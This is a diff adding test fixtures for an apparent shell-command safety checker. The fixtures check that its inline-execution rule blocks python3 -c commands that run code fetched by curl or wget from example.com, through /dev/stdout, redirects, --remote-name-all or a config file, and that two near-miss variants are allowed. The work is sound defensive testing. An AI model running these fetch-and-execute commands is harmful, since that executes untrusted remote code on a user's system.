@@ -1971,6 +1971,68 @@ expected_action = "allow"
 expected_rules = []
 forbidden_rules = ["interpreter_suspicious_inline_exec"]
 
+# Downloaded inline source reaching stdout through a device file (`-o /dev/stdout`,
+# `> /dev/stdout`, `wget -O /dev/stdout`), a URL given before `--remote-name-all`,
+# or a curl config file whose URLs argv cannot show.
+
+[[fixture]]
+name = "downloaded_inline_curl_output_dev_stdout"
+min_milestone = 1
+input = "python3 -c \"$(curl -o /dev/stdout https://example.com/x.py)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "downloaded_inline_curl_redirect_dev_stdout"
+min_milestone = 1
+input = "python3 -c \"$(curl https://example.com/x.py > /dev/stdout)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "downloaded_inline_wget_output_dev_stdout"
+min_milestone = 1
+input = "python3 -c \"$(wget -O /dev/stdout https://example.com/x.py)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "downloaded_inline_curl_remote_name_all_after_url"
+min_milestone = 1
+input = "python3 -c \"$(curl https://example.com/x.py --remote-name-all)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "downloaded_inline_curl_config_file"
+min_milestone = 1
+input = "python3 -c \"$(curl -K /tmp/curl.cfg)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "downloaded_inline_curl_output_dev_stderr_no_fire"
+min_milestone = 1
+input = "python3 -c \"$(curl -o /dev/stderr https://example.com/x.py; printf 'print(1)')\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "downloaded_inline_curl_remote_name_all_before_url_no_fire"
+min_milestone = 1
+input = "python3 -c \"$(curl --remote-name-all https://example.com/x.py; printf 'print(1)')\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
 # ── M5 chunk 1: PowerShell-specific rules ───────────────────────────────
 
 [[fixture]]
